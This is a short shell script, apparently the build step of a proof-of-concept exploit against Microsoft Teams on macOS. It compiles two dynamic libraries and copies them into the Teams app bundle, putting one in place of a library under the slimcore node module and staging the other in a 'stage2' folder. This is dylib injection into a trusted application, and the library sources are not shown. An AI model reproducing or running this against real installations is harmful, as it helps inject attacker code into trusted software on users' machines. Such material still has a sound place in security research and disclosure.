echo "[*] Building exploit"
gcc -dynamiclib ./libssScreenVVS2/libssScreenVVS2.m -o ./libssScreenVVS2/libssScreenVVS2.dylib -framework Foundation
gcc -dynamiclib ./libinstallPlist/libinstallPlist.m -o ./libinstallPlist/libinstallPlist.dylib -framework Foundation
echo "[*] Copying files"
cp ./libinstallPlist/libinstallPlist.dylib ./msteams/stage2/libinstallPlist.dylib
cp ./libssScreenVVS2/libssScreenVVS2.dylib ./msteams/Microsoft\ Teams.app/Contents/Resources/app.asar.unpacked/node_modules/slimcore/bin/libssScreenVVS2.dylib
echo "[*] Done"